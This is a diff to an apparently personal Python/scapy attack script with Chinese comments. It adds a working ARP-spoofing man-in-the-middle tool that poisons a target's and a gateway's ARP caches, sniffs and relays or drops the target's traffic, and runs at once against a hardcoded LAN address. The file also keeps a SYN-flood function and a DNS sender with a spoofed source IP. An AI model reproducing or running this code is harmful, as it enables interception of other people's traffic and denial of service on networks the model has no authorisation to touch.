@@ -1,13 +1,18 @@
-# coding:utf-8
-# python3.6
+# -*- coding: utf-8 -*- 
+# @Time : 2019/5/10 上午 09:29 
+# @Author : gyn 
+# @email : guogyn@foxmail.com
 
 from telnetlib import IP
+from threading import Event
+from traceback import format_exc
+
 from scapy.all import *
 from time import sleep
 
 from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import TCP, UDP
-from scapy.layers.l2 import Ether, ARP
+from scapy.layers.l2 import Ether, ARP, getmacbyip
 from random import randrange
 
 
@@ -27,7 +32,7 @@ def sort_ip_mac_pair(a):
     return [[strl(i[0]), i[1]] for i in b]
 
 
-def get_gw_and_self(netcard, gw_ip):
+def get_gw_and_self(netcard='Broadcom 802.11n 网络适配器', gw_ip='192.168.123.1'):
     p = Ether() / ARP(pdst=gw_ip)
     ans, unans = srp(p, iface=netcard, verbose=0)    # 会发送两次，一次广播，一次指定网关
     # ans, unans = srp(p, iface=netcard, verbose=0)  # 会发送两次，一次广播，一次指定网关
@@ -41,6 +46,7 @@ def get_gw_and_self(netcard, gw_ip):
         }
 
 
+# windows
 def get_self_ip_gw_win():
     # 扫描局域网，显示活跃主机
     for line in os.popen('route print'):
@@ -171,12 +177,147 @@ def syn_flood(dst_ip, dst_port):
 
 
 def dns_attack(dst_ip, src_ip):
-    a = IP(dst='8.8.8.8', src='192.168.1.200')  # 192.168.1.200 为伪造的源ip
+    a = IP(dst=dst_ip, src=src_ip)  # 192.168.1.200 为伪造的源ip
     b = UDP(dport=53)
     c = DNS(id=1, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0, nscount=0, arcount=0)
     c.qd = DNSQR(qname='www.qq.com', qtype=1, qclass=1)
     p = a / b / c
     send(p)
+
+
+def agent_attack_cell(trick_taget, trick_gateway, t=1):
+    sendp(trick_taget, verbose=0)
+    sendp(trick_gateway, verbose=0)
+    sleep(t)
+
+
+def agent_attack(self_mac, target_ip, target_mac, gw_ip, gw_mac):
+    # 欺骗目标本机为网关
+    trick_taget = Ether(dst=target_mac, src=self_mac) / ARP(op=2, psrc=gw_ip, hwsrc=self_mac, hwdst=target_mac)
+    # 欺骗网关本机为目标
+    trick_gateway = Ether(dst=gw_mac, src=self_mac) / ARP(op=2, psrc=target_ip, hwsrc=self_mac, hwdst=gw_mac)
+    print("攻击开始，目标ip %s，目标Mac %s" % (target_ip, target_mac))
+    t = int(input("请输入攻击时间（S）:"))
+    for i in range(t):
+        agent_attack_cell(trick_taget, trick_gateway, 1)
+    print("攻击结束。。。")
+    pass
+
+
+# 线程单元，传入线程要执行的方法和方法需要的参数
+class MTread(Thread):
+
+    def __init__(self, tid, func=None, *args):
+        super().__init__()
+        self.tid = tid            # 线程 id or name
+        self.__flag = Event()     # 用于暂停线程的标识
+        self.__running = Event()  # 用于停止线程的标识
+        self.__flag.set()         # 设置为True, 不暂停
+        self.__running.set()      # 将running设置为True，不停止
+
+        self.func = func          # 要执行的方法
+        self.args = args          # func的参数
+
+    def pause_on(self, pause_time):    # 暂停
+        self.__flag.clear()  # 设置为False, 让线程阻塞
+        sleep(pause_time)   # pause_time 秒后恢复
+        self.resume()
+
+    def pause(self):    # 暂停
+        self.__flag.clear()  # 设置为False, 让线程阻塞
+
+    def resume(self):   # 恢复
+        self.__flag.set()  # 设置为True, 让线程停止阻塞
+        print("线程【%s】苏醒，继续工作" % self.tid)
+
+    def stop(self):     # 停止
+        self.__flag.set()  # 将线程从暂停状态恢复, 如果已经暂停的话
+        self.__running.clear()  # 设置为False
+
+    def run(self):
+        while True:
+            if self.__running.is_set():   # 判断是否可运行
+                self.__flag.wait()  # 再判断是否处于暂停状态，为True时立即返回, 为False时则一直阻塞到内部的标识位为True后继续
+                try:
+                    # op
+                    if self.func:
+                        self.func(*self.args)
+                    pass
+                except Exception as e:
+                    print(format_exc(), e)
+
+
+def pack(packet, self_mac, target_mac, gw_mac, transmit=1):  # 对监听到的包进行处理
+    # 目标发送到网关（本机）的数据包
+    if packet.src == target_mac and packet.dst == self_mac:
+        packet.src = self_mac
+        packet.dst = gw_mac
+        if transmit:  # 是否转发，若不转发，目标将断网
+            sendp(packet, verbose=False)
+        print('目标-->网关')
+    # 真网关发送到目标的数据包
+    elif packet.src == gw_mac and packet.dst == self_mac:
+        packet.src = self_mac
+        packet.dst = target_mac
+        if transmit:  # 是否转发，若不转发，目标将断网
+            sendp(packet, verbose=False)
+        print('网关-->目标')
+    # 单独拿出速度好慢
+    # if transmit:    # 是否转发，若不转发，目标将断网
+    #    sendp(packet, verbose=False)
+
+
+def snifer_shell(mfilter, mprn):
+    sniff(filter=mfilter, prn=mprn)
+
+
+def test_agent_agent_attack():
+    netcard = 'Broadcom 802.11n 网络适配器'
+    gw_ip = '192.168.123.1'
+    target_ip = '192.168.123.224'
+    temp = get_gw_and_self(netcard, gw_ip)
+    self_ip = temp.get('self_ip')
+    self_mac = temp.get('self_mac')
+    target_mac = getmacbyip(target_ip)
+    gw_mac = temp.get('gw_mac')
+
+    # 欺骗目标本机为网关
+    trick_taget = Ether(dst=target_mac, src=self_mac) / ARP(op=2, psrc=gw_ip, hwsrc=self_mac, hwdst=target_mac)
+    # 欺骗网关本机为目标
+    trick_gateway = Ether(dst=gw_mac, src=self_mac) / ARP(op=2, psrc=target_ip, hwsrc=self_mac, hwdst=gw_mac)
+
+    t = int(input("请输入攻击时间间隔（秒）:"))
+    tricker = MTread('tricker', agent_attack_cell, trick_taget, trick_gateway, t)
+    tricker.start()
+    # threading.Thread
+    mfilter = "!arp and host "+target_ip
+    mprn = lambda pkt: pack(pkt, self_mac, target_mac, gw_mac)
+    # sniffer = MTread('sniffer', snifer_shell, mfilter, mprn)
+    # sniffer.start()
+    threading.Thread(name='sniffer', target=snifer_shell, args=[mfilter, mprn]).start()
+
+    print("攻击开始，目标ip %s，目标Mac %s" % (target_ip, target_mac))
+    print('您可输入数字命令控制任务：')
+    print("stop trick: 0， pause trick: 1，resume trick: 2")
+    f0 = 1      # running state
+    while 1:
+        f1 = int(input("cmd(a number): "))
+        if f0 == 1:             # stop or pause
+            if f1 == 1:
+                tricker.pause()
+                f0 = 0          # paused
+                print('tricker已暂停')
+            elif f1 == 0:
+                tricker.stop()     # stopped
+                break
+        elif f0 == 0:
+            if f1 == 2:
+                tricker.resume()   # resume -> running
+                f0 = 1
+                print('tricker已恢复')
+    print('已停止')
+test_agent_agent_attack()
+
 # arp_attack_test()
 # syn_flood('192.168.123.1', 80)
 # https://www.freebuf.com/articles/4922.html
